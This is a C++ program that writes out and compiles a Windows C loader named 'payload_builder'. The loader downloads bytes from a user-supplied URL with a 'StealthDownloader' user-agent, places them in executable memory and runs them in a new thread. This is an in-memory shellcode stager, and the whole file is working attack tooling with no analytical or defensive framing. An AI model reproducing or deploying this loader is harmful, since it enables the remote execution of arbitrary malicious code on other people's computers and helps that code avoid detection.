#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>

void GenerateCFile(const std::string& url) {
    std::ofstream cFile("payload_builder.c");
    
    if (!cFile) {
        std::cerr << "Error creating C file." << std::endl;
        return;
    }

    cFile << "#include <windows.h>\n";
    cFile << "#include <wininet.h>\n";
    cFile << "#include <stdio.h>\n";
    cFile << "\n";
    cFile << "#pragma comment(lib, \"wininet.lib\")\n";
    cFile << "\n";
    cFile << "BOOL DownloadPayload(const char* url, BYTE** payloadData, DWORD* payloadSize) {\n";
    cFile << "    HINTERNET hInternet, hConnect;\n";
    cFile << "    BOOL result = FALSE;\n";
    cFile << "    DWORD bytesRead;\n";
    cFile << "\n";
    cFile << "    hInternet = InternetOpen(\"StealthDownloader\", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\n";
    cFile << "    if (hInternet == NULL) {\n";
    cFile << "        return FALSE;\n";
    cFile << "    }\n";
    cFile << "\n";
    cFile << "    hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);\n";
    cFile << "    if (hConnect == NULL) {\n";
    cFile << "        InternetCloseHandle(hInternet);\n";
    cFile << "        return FALSE;\n";
    cFile << "    }\n";
    cFile << "\n";
    cFile << "    DWORD size;\n";
    cFile << "    if (InternetQueryDataAvailable(hConnect, &size, 0, 0) && size > 0) {\n";
    cFile << "        *payloadData = (BYTE*)malloc(size);\n";
    cFile << "        if (*payloadData != NULL) {\n";
    cFile << "            if (InternetReadFile(hConnect, *payloadData, size, &bytesRead) && bytesRead == size) {\n";
    cFile << "                *payloadSize = size;\n";
    cFile << "                result = TRUE;\n";
    cFile << "            } else {\n";
    cFile << "                free(*payloadData);\n";
    cFile << "            }\n";
    cFile << "        }\n";
    cFile << "    }\n";
    cFile << "\n";
    cFile << "    InternetCloseHandle(hConnect);\n";
    cFile << "    InternetCloseHandle(hInternet);\n";
    cFile << "    return result;\n";
    cFile << "}\n";
    cFile << "\n";
    cFile << "void ExecutePayloadInMemory(const BYTE* payloadData, DWORD payloadSize) {\n";
    cFile << "    void* execMemory = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n";
    cFile << "    if (execMemory != NULL) {\n";
    cFile << "        memcpy(execMemory, payloadData, payloadSize);\n";
    cFile << "        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)execMemory, NULL, 0, NULL);\n";
    cFile << "        if (hThread != NULL) {\n";
    cFile << "            WaitForSingleObject(hThread, INFINITE);\n";
    cFile << "            CloseHandle(hThread);\n";
    cFile << "        }\n";
    cFile << "        VirtualFree(execMemory, 0, MEM_RELEASE);\n";
    cFile << "    }\n";
    cFile << "}\n";
    cFile << "\n";
    cFile << "int main() {\n";
    cFile << "    const char* url = \"" << url << "\";\n";
    cFile << "    BYTE* payloadData = NULL;\n";
    cFile << "    DWORD payloadSize = 0;\n";
    cFile << "\n";
    cFile << "    if (DownloadPayload(url, &payloadData, &payloadSize)) {\n";
    cFile << "        ExecutePayloadInMemory(payloadData, payloadSize);\n";
    cFile << "        free(payloadData);\n";
    cFile << "    }\n";
    cFile << "\n";
    cFile << "    return 0;\n";
    cFile << "}\n";

    cFile.close();
    std::cout << "C file created successfully." << std::endl;
}

int main() {
    std::string url;
    std::cout << "Enter the URL of the payload: ";
    std::cin >> url;

    GenerateCFile(url);

    // Compile the C file into an executable using the system's compiler
    // Note: Adjust the compiler command as needed for your system (e.g., cl.exe for Visual Studio)
    system("gcc -o payload_builder.exe payload_builder.c");

    std::cout << "Executable created successfully." << std::endl;

    return 0;
}
